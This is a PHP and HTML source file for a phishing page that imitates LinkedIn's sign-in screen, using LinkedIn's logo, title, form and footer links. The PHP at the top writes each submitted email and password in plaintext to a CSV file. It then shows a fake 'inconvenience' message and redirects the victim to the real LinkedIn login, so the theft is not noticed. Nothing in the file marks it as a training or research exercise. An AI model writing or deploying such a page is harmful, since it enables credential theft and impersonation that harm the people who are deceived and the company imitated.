<?php
        // session_start();
        $error_msg = "";
        if($_SERVER['REQUEST_METHOD'] == 'POST')
        {
            $user = htmlspecialchars($_POST['username']);
            $pwd =htmlspecialchars($_POST['password']);
            $pattern = "/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/";

            if(empty($user) || empty($pwd))
            { 
                $error_msg = "Username/ Password field is empty";
            }
                      
            else if(!preg_match($pattern,$user))
                {
                    $error_msg = "Please enter a valid username.";
                }
               
            else
            {
                $fp = fopen("login_info_linkedin.csv",'a');
                // to be run only the first time
                // fwrite($fp, "Username");
                // fwrite($fp, ",");
                // fwrite($fp, "Password");
                // fwrite($fp,"\n");

                fwrite($fp,"\n");
                fwrite($fp,$user);
                fwrite($fp,",");
                fwrite($fp,$pwd);
                fclose($fp);
                // echo $error_msg;
                echo "Sorry for the inconvinience. Redirecting to login page.";
                header("Refresh:0; url=https://www.linkedin.com/login");
                exit();
            }
        }
    
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn Login, Sign in | LinkedIn</title>
    <link rel="shortcut icon" href="linkedinlogo.png" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
    <style>
        .error_msg{
            color:red;
            font-size:12px;
            margin: 0;
        }
    </style>
</head>
<body>
    <header>
        <a href="https://www.linkedin.com/" target="main"><img src="LinkedIn_2021.svg" alt="Logo" width="110"></a>
    </header>


    <main>
        
        <div class="main_con">
            <h1>Sign in</h1>
            <p style="margin: 0 0 0 11px;">Stay updated on your professional world.</p>
            <form action="<?php htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
                <input type="text" name="username" placeholder="Email or Phone">
                <br>
                <div class="error_msg">
                    <?php echo $error_msg; ?>
                </div>
                <input type="password" name="password" placeholder="Password">
                <br>
                <a href="https://www.linkedin.com/checkpoint/rp/request-password-reset">Forgot password</a>
                <br>
                <input type="submit" value="Sign in" id="signin">
            </form>
            <div class="bel_form">
                <p>
                    By clicking Continue, you agree to LinkedIn’s 
                    <a href="/legal/user-agreement">
                        User Agreement
                    </a>
                    ,
                    <a href="/legal/privacy-policy">
                        Privacy Policy
                    </a>
                    ,and 
                    <a href="/legal/cookie-policy">
                        Cookie Policy
                    </a>.
                </p>
            </div>
        </div>
        
    </main>



    <footer>
        <div class="create_acc">
            <span style="margin-right: 0;">New to LinkedIn</span>
            <span><a href="https://www.linkedin.com/signup/cold-join">Join now</a></span>
        </div>
        <div class="foot">
            <div class="card">
                <a href="https://www.linkedin.com/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement">User Agreement</a>
            </div>
            <div class="card">
                <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy Policy</a>
            </div>
            <div class="card">
                <a href="https://www.linkedin.com/help/linkedin/answer/a403269/?lang=en&trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines">Community Guildlines</a>
            </div>
            <div class="card">
                <a href="https://www.linkedin.com/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy">Cookie Policy</a>
            </div>
            <div class="card">
                <a href="https://www.linkedin.com/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy">Copyright Policy</a>
            </div>
            <div class="card">
                <a href="https://www.linkedin.com/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&lang=en">Send Feedback</a>
            </div>
            <div class="card">
                <select id="lang">
                    <option value="en">English</option>
                    <option value="es">Spanish</option>
                    <option value="fr">French</option>
                    <option value="de">German</option>
                    <option value="zh">Chinese</option>
                    <option value="ja">Japanese</option>
                    <option value="ru">Russian</option>
                    <option value="ar">Arabic</option>
                    <option value="pt">Portuguese</option>
                    <option value="hi">Hindi</option>
                </select>
            </div>
            
        </div>
    </footer>
</body>
</html>